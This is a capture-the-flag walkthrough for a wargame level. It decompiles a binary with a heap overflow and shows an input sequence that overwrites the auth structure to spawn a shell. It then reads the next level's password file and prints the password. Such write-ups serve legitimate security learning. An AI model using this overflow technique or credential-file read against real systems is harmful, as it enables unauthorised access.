# Level 08 Walkthrough

## Binary analysis

The binary manages two pointers, `auth` and `service`, and processes commands: `auth`, `reset`, `service`, and `login`. The goal is to manipulate the `auth` structure so that the check `*(auth + 0x20) != 0` passes, which allows us to get a shell when issuing the `login` command.

### Key decompiled code

- **auth**
    ```c
    if (strncmp(buf, "auth ", 5) == 0) {
        auth = malloc(4);
        *auth = 0;
        // ...
        strcpy(auth, user_input); // possible overflow
    }
    ```
- **service**
    ```c
    if (strncmp(buf, "service", 7) == 0) {
        service = strdup(user_input); // can overflow into auth
    }
    ```
- **login**
    ```c
    if (strncmp(buf, "login", 5) == 0) {
        if (*(auth + 0x20) != 0) {
            system("/bin/sh");
        } else {
            printf("Password:\n");
        }
    }
    ```
- **main loop**
    ```c
    while (fgets(buf, 0x80, stdin)) {
        // handle commands: auth, reset, service, login
    }
    ```

## Exploitation

We use the `auth` command to allocate the structure, then the `service` command with a long string to overflow and set the 0x20th byte of the `auth` structure to a non-zero value. Finally, we use the `login` command to trigger the shell.

Example commands:

```
./level8
auth
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
cat /home/user/level9/.pass
```

## Result

After running the exploit, we get the password for level9:

```
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Copy the password for the next level. 